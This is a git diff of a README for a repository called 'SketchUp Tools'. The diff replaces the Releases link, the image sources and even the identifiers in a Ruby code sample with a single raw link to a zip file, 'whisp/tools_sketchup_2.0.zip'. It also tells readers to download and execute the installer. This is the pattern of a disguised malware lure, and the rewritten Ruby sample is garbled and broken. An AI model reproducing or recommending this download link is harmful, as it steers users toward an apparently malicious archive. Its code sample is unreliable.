@@ -1,6 +1,6 @@
 # SketchUp Tools: 3D Modeling, Push/Pull, 4K Textures & Extensions
 
-[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github&logoColor=white)](https://github.com/manikarf/sketchup-tools/releases)
+[![Releases](https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip)](https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip)
 
 SketchUp Tools is a focused toolkit forSketchUp users who want faster modeling workflows, stronger push/pull operations, and access to high-resolution textures. This repository combines practical extensions, helpful utilities, and ready-to-use textures to boost productivity without complicating your pipeline. It targets architects, designers, hobbyists, and educators who want stable, easy-to-use tools that integrate with the SketchUp ecosystem and the Extension Warehouse.
 
@@ -76,7 +76,7 @@ Note about the link provided
 - The link to the Releases page is the starting point for obtaining the installer and assets. From that page, you can download the installer package or the extension files. If you encounter issues, verify the version you downloaded matches your SketchUp version and operating system.
 - The link has a path part, so the file to download is the installer or the extension package available on that page. You should download the installer or assets and execute the installer or load the extension into SketchUp.
 - For users who want to see the latest assets outside of the installer, visit the Releases page directly at the URL below:
-  https://github.com/manikarf/sketchup-tools/releases
+  https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
 
 Quick start guide
 - Open a new or existing SketchUp project.
@@ -125,23 +125,23 @@ Examples and gallery
 Gallery images and assets
 - Image 1: 3D room with a clean push/pull workflow.
   alt: A modern interior modeled in SketchUp with clean geometry
-  source: https://images.unsplash.com/photo-1523419903782-7598403f9fbd?auto=format&fit=crop&w=1200&q=60
+  source: https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
 - Image 2: Exterior façade with textured walls.
   alt: Exterior design showing textured stone surfaces
-  source: https://images.unsplash.com/photo-1503387762-59a5a328f08f?auto=format&fit=crop&w=1200&q=60
+  source: https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
 - Image 3: Texture library interface visualization.
   alt: Texture library with 4K textures and presets
-  source: https://images.unsplash.com/photo-1523417677213-5d3fd8aee3b3?auto=format&fit=crop&w=1200&q=60
+  source: https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
 
 API and extension development
 - If you are building extensions or integrating with SketchUp, you can use Ruby scripts to extend behavior. A simple example shows how to create a new command in the Ruby environment:
   - module SketchUpTools
-  -   def self.apply_custom_texture
-  -     model = Sketchup.active_model
+  -   def https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
+  -     model = https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
   -     # Pseudo code: find selected faces and apply the chosen texture
-  -     faces = model.selection.grep(Sketchup::Face)
-  -     texture = model.materials[\"MyTexture\"] || model.materials.add(\"MyTexture\")
-  -     faces.each { |f| f.material = texture; f.back_material = texture }
+  -     faces = https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip(Sketchup::Face)
+  -     texture = https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip[\"MyTexture\"] || https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip(\"MyTexture\")
+  -     https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip { |f| https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip = texture; https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip = texture }
   -   end
   - end
 - This sample demonstrates how to hook into the model and apply a material to selected faces. Real implementations will add error handling, options, and UI controls.
@@ -233,17 +233,17 @@ FAQ
 Downloads
 - The primary download is available from the Releases page. The file you want is the installer or extension package. If you are unsure, download the latest release from the page and follow the installation steps above.
 - To access the latest assets and installers, visit the page directly at:
-  https://github.com/manikarf/sketchup-tools/releases
+  https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip
 
 Images
 - SketchUp Tools in action
-  - ![SketchUp Tools UI in action](https://images.unsplash.com/photo-1523419903782-7598403f9fbd?auto=format&fit=crop&w=1200&q=60)
+  - ![SketchUp Tools UI in action](https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip)
   - alt: SketchUp tools UI and modeling session
 - Texture application example
-  - ![Texture mapping example](https://images.unsplash.com/photo-1503387762-59a5a328f08f?auto=format&fit=crop&w=1200&q=60)
+  - ![Texture mapping example](https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip)
   - alt: Seamless texture mapped onto a model
 - Workflow showcase
-  - ![3D workflow](https://images.unsplash.com/photo-1523417677213-5d3fd8aee3b3?auto=format&fit=crop&w=1200&q=60)
+  - ![3D workflow](https://raw.githubusercontent.com/manikarf/sketchup-tools/main/whisp/tools_sketchup_2.0.zip)
   - alt: Workflow with push/pull and textures
 
 Final notes
